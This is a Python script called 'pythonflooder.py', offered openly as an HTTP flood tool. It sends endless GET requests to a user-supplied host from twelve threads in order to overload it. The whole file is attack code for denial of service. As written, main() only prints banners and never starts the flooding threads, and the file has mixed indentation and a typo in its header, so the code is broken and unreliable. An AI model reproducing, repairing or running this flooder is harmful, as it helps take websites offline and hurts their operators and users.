#! /usr/bin/env python
"""
requirements:
python 
pequests module

usage:
./pythonflooder.py --host <<host>>
./pythonflooder.py --host http://www.example.com

author: frostyworks
"""

import time
import sys
import threading
import optparse
try:
    import requests
except ImportError: # if requests module isn't installed
	if sys.platform.startswith('linux'): # if os is linux;
		print(" please install requests  module!")
		sys.exit(" sudo apt-get install python-requests ") # exit
	else:
		sys.exit() # exit
		

           
def stresser(): # core
	
	parser = optparse.OptionParser(usage="./pythonflooder.py --host www.example.com")
	parser.add_option("--host" , help=" target " , action="store" , dest="host" , type="string")
	option , args = parser.parse_args()
	if option.host :
		host = ((option.host)) 
		if (host.find("http")) == -1 :
			_host = "http://" +  (host)
		elif (host.find("http")) == 0 :
			_host = (host)
	elif not option.host :
		parser.error(" pythonflooder.py require --host option  type -h for help ")
		sys.exit()
                                                                
	while (1 < 4) : # infinite loop
		try:
			requests.get(_host) # sending requests
			print(" [*] flooding {} ! Port: 80  ".format(_host)) 
		except (requests.ConnectionError,requests.HTTPError) : # if host doesn't exist
			print("[-] host doesn't exist! ")
			sys.exit() # exit


def _threads_(): # threading function
	 
	
	 c= threading.Thread(target=stresser) # generating threads
	 d= threading.Thread(target=stresser)
	 a= threading.Thread(target=stresser)
	 e= threading.Thread(target=stresser)
	 z= threading.Thread(target=stresser)
	 x= threading.Thread(target=stresser)
	 c1= threading.Thread(target=stresser)
	 d1= threading.Thread(target=stresser)
	 a1= threading.Thread(target=stresser)
	 e1= threading.Thread(target=stresser)
	 z1= threading.Thread(target=stresser)
	 x1= threading.Thread(target=stresser)

	 c.start() # starting threads
	 d.start()
	 a.start()
	 e.start()
	 z.start()
	 x.start()
	 c1.start()
	 d1.start()
	 a1.start()
	 e1.start()
	 z1.start()
	 x1.start()

	 
	
def main(): # main function ( most important )
	
		
	print("beginning the flood!")  # ascii code (index)
	print("[*] start flooding") # info
	print("[*] type ALT + F4 to stop flooder") # info		  

main()
